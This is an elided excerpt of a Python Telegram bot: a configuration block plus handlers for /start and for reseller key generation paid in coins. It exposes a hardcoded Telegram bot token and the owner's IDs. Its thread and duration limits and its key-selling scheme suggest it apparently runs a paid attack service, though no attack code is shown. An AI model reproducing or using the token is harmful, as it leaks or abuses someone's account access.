...
TELEGRAM_BOT_TOKEN = '7029774286:AAEF3WiiB4xBqEliWlzj8iXWv9KrmtU8XIY'
OWNER_USERNAME = "itzmd808sahilSELLER"
CO_OWNERS = []  # List of user IDs for co-owners
OWNER_CONTACT = "Contact to buy keys"
ALLOWED_GROUP_IDS = [-4782991829]
MAX_THREADS = 500
max_duration = 600
bot_open = False
...
OWNER_ID = 5879359815  # Your user ID
COOWNER_IDS = [5879359815]  # Other admin IDs
...
GET_GROUP_LINK = 36  # Add this line for the group link state
...
async def start(update: Update, context: CallbackContext):
    ...
    # Get appropriate image for this group or default
    image = get_group_image(chat.id if chat.type in ['group', 'supergroup'] else 'default')
...
async def generate_key_duration(update: Update, context: CallbackContext):
    ...
    if is_reseller(update):
        ...
        if reseller_balances[user_id] < price:
            await update.message.reply_text(
                f"❌ *Insufficient balance!*\n"
                f"*Required:* {price} coins\n"
                f"*Your balance:* {reseller_balances[user_id]} coins\n\n"
                f"Use /addcoin to add more coins.",
                parse_mode='Markdown'
            )
            return ConversationHandler.END
    ...
    await update.message.reply_text(
        ...
        f"*Cost:* {price if is_reseller(update) else 0} coins\n"
        f"*Your new balance:* {reseller_balances.get(user_id, 0) if is_reseller(update) else 'N/A'}\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )
    return ConversationHandler.END
